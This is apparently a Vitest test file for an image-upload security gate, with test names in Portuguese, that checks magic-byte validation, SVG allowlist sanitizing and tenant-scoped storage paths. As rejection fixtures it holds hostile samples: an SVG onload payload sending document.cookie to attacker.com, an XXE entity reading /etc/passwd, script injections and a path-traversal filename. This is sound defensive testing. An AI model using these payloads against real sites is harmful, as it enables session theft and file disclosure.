import { describe, it, expect } from 'vitest';

describe('Gate de Desempenho e Segurança de Imagens', () => {
  describe('1. Validação Binária de Magic Bytes (Server-Side)', () => {
    // Exact logic from advertiser-profile-service.ts
    function validateImageMagicBytes(buffer: Uint8Array): boolean {
      if (!buffer || buffer.length < 4) return false;
      // JPEG: FF D8 FF
      if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) return true;
      // PNG: 89 50 4E 47
      if (buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4e && buffer[3] === 0x47) return true;
      // WebP: RIFF (bytes 0-3) + WEBP (bytes 8-11)
      if (
        buffer.length >= 12 &&
        buffer[0] === 0x52 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x46 &&
        buffer[8] === 0x57 && buffer[9] === 0x45 && buffer[10] === 0x42 && buffer[11] === 0x50
      ) return true;
      // GIF: 47 49 46 38
      if (buffer[0] === 0x47 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x38) return true;
      return false;
    }

    it('aceita JPEG genuíno com assinatura FF D8 FF', () => {
      const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
      expect(validateImageMagicBytes(jpeg)).toBe(true);
    });

    it('aceita PNG genuíno com assinatura 89 50 4E 47', () => {
      const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      expect(validateImageMagicBytes(png)).toBe(true);
    });

    it('aceita WebP genuíno com RIFF e marcador WEBP nos bytes 8..11', () => {
      // 'RIFF' + 4 bytes length + 'WEBP'
      const webp = new Uint8Array([
        0x52, 0x49, 0x46, 0x46, // RIFF
        0x20, 0x00, 0x00, 0x00, // file size
        0x57, 0x45, 0x42, 0x50, // WEBP
        0x56, 0x50, 0x38, 0x20, // VP8
      ]);
      expect(validateImageMagicBytes(webp)).toBe(true);
    });

    it('rejeita container RIFF falso que não seja WebP (ex: áudio WAV com RIFF....WAVE)', () => {
      const wavAudio = new Uint8Array([
        0x52, 0x49, 0x46, 0x46, // RIFF
        0x20, 0x00, 0x00, 0x00, // file size
        0x57, 0x41, 0x56, 0x45, // WAVE (áudio)
      ]);
      expect(validateImageMagicBytes(wavAudio)).toBe(false);
    });

    it('rejeita container RIFF AVI de vídeo (RIFF....AVI )', () => {
      const aviVideo = new Uint8Array([
        0x52, 0x49, 0x46, 0x46, // RIFF
        0x20, 0x00, 0x00, 0x00, // file size
        0x41, 0x56, 0x49, 0x20, // AVI 
      ]);
      expect(validateImageMagicBytes(aviVideo)).toBe(false);
    });

    it('rejeita arquivos de texto ou SVG malformados enviados como imagem raster', () => {
      const textFile = new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
      expect(validateImageMagicBytes(textFile)).toBe(false);
    });

    it('rejeita arquivos truncados com menos de 4 bytes', () => {
      expect(validateImageMagicBytes(new Uint8Array([0xff, 0xd8]))).toBe(false);
      expect(validateImageMagicBytes(new Uint8Array([]))).toBe(false);
    });
  });

  describe('2. Sanitização Estrita de SVG em Selos Institucionais (Allowlist)', () => {
    it('aprova SVG vetorial limpo e bem formatado com elementos permitidos', async () => {
      const { sanitizeAndValidateSvg } = await import('../src/lib/media/svg-sanitizer');
      const cleanSvg = `<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g1"><stop offset="0%" stop-color="#c9a227"/></linearGradient></defs><circle cx="50" cy="50" r="40" fill="url(#g1)"/></svg>`;
      expect(sanitizeAndValidateSvg(cleanSvg).valid).toBe(true);
    });

    it('bloqueia SVG contendo injeção de <script>', async () => {
      const { sanitizeAndValidateSvg } = await import('../src/lib/media/svg-sanitizer');
      const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg"><script>alert("xss")</script><circle cx="10" cy="10" r="5"/></svg>`;
      const res = sanitizeAndValidateSvg(maliciousSvg);
      expect(res.valid).toBe(false);
      expect(res.error).toContain('script');
    });

    it('bloqueia SVG contendo <foreignObject> ou <iframe>', async () => {
      const { sanitizeAndValidateSvg } = await import('../src/lib/media/svg-sanitizer');
      const foreignSvg = `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><iframe src="https://malicious.com"></iframe></foreignObject></svg>`;
      const res = sanitizeAndValidateSvg(foreignSvg);
      expect(res.valid).toBe(false);
      expect(res.error).toContain('foreignObject');
    });

    it('bloqueia SVG com manipulador inline onload ou onerror', async () => {
      const { sanitizeAndValidateSvg } = await import('../src/lib/media/svg-sanitizer');
      const onloadSvg = `<svg onload="fetch('https://attacker.com?c='+document.cookie)" xmlns="http://www.w3.org/2000/svg"></svg>`;
      const res = sanitizeAndValidateSvg(onloadSvg);
      expect(res.valid).toBe(false);
      expect(res.error).toContain('manipuladores inline');
    });

    it('bloqueia SVG com tentativa de ataque XXE via <!ENTITY ou <!DOCTYPE', async () => {
      const { sanitizeAndValidateSvg } = await import('../src/lib/media/svg-sanitizer');
      const xxeSvg = `<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>`;
      const res = sanitizeAndValidateSvg(xxeSvg);
      expect(res.valid).toBe(false);
      expect(res.error).toContain('declarações DTD/ENTITY');
    });

    it('bloqueia SVG com link externo em href ou tags não autorizadas', async () => {
      const { sanitizeAndValidateSvg } = await import('../src/lib/media/svg-sanitizer');
      // Elemento <a> não está na allowlist
      const aTagRes = sanitizeAndValidateSvg(`<svg xmlns="http://www.w3.org/2000/svg"><a href="https://phishing.com"><text>Click</text></a></svg>`);
      expect(aTagRes.valid).toBe(false);

      // Elemento <use> com href externo (não local)
      const extUseRes = sanitizeAndValidateSvg(`<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.com/icon.svg#test" /></svg>`);
      expect(extUseRes.valid).toBe(false);
      expect(extUseRes.error).toContain('href');
    });

    it('bloqueia SVG com XML malformado (tags não balanceadas, tags não fechadas ou comentários abertos)', async () => {
      const { sanitizeAndValidateSvg } = await import('../src/lib/media/svg-sanitizer');
      // Tag não fechada
      const unclosedRes = sanitizeAndValidateSvg(`<svg xmlns="http://www.w3.org/2000/svg"><g><rect width="10" height="10"></svg>`);
      expect(unclosedRes.valid).toBe(false);
      expect(unclosedRes.error).toContain('malformada');

      // Tag de fechamento sem correspondência
      const mismatchedRes = sanitizeAndValidateSvg(`<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0" /></g></svg>`);
      expect(mismatchedRes.valid).toBe(false);
      expect(mismatchedRes.error).toContain('estrutura XML malformada');

      // Comentário XML não finalizado
      const unclosedComment = sanitizeAndValidateSvg(`<svg xmlns="http://www.w3.org/2000/svg"><!-- comentário sem fim <circle r="5"/>`);
      expect(unclosedComment.valid).toBe(false);
      expect(unclosedComment.error).toContain('comentário XML malformado');
    });

    it('bloqueia SVG com referência externa dentro de url(...) em estilos ou atributos', async () => {
      const { sanitizeAndValidateSvg } = await import('../src/lib/media/svg-sanitizer');
      const extUrlRes = sanitizeAndValidateSvg(`<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(https://evil.com/leak.png)" /></svg>`);
      expect(extUrlRes.valid).toBe(false);
      expect(extUrlRes.error).toContain('url(...)');
    });
  });

  describe('3. Isolamento Multi-Tenant e Estrutura Canônica de Storage', () => {
    it('constrói caminhos com tenant_id resolvido no servidor, sem aceitar injeção de caminho', () => {
      const tenantId = '00000000-0000-0000-0000-000000000001';
      const businessId = '11111111-1111-1111-1111-111111111111';
      const assetType = 'logo';
      const timestamp = 1790000000000;
      const unsafeFilename = '../../malicious../file name.webp';
      const safeFilename = unsafeFilename.replace(/[^a-zA-Z0-9.-]/g, '_');

      const storagePath = `${tenantId}/${businessId}/${assetType}/${timestamp}-${safeFilename}`;

      expect(storagePath).toBe('00000000-0000-0000-0000-000000000001/11111111-1111-1111-1111-111111111111/logo/1790000000000-.._.._malicious.._file_name.webp');
      expect(storagePath.startsWith(`${tenantId}/${businessId}/`)).toBe(true);
    });

    it('sincroniza extensão e MIME type com os magic bytes binários reais para PNG e WebP', () => {
      // Magic bytes PNG: 89 50 4E 47
      const pngBuffer = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      // Magic bytes WebP: RIFF (0..3) + WEBP (8..11)
      const webpBuffer = new Uint8Array([
        0x52, 0x49, 0x46, 0x46,
        0x00, 0x00, 0x00, 0x00,
        0x57, 0x45, 0x42, 0x50,
      ]);

      const isPng = pngBuffer[0] === 0x89 && pngBuffer[1] === 0x50 && pngBuffer[2] === 0x4e && pngBuffer[3] === 0x47;
      const isWebp = webpBuffer[0] === 0x52 && webpBuffer[1] === 0x49 && webpBuffer[2] === 0x46 && webpBuffer[3] === 0x46
        && webpBuffer[8] === 0x57 && webpBuffer[9] === 0x45 && webpBuffer[10] === 0x42 && webpBuffer[11] === 0x50;

      expect(isPng).toBe(true);
      expect(isWebp).toBe(true);
      expect(isPng ? 'image/png' : 'image/webp').toBe('image/png');
      expect(isWebp ? 'image/webp' : 'image/png').toBe('image/webp');
    });
  });
});
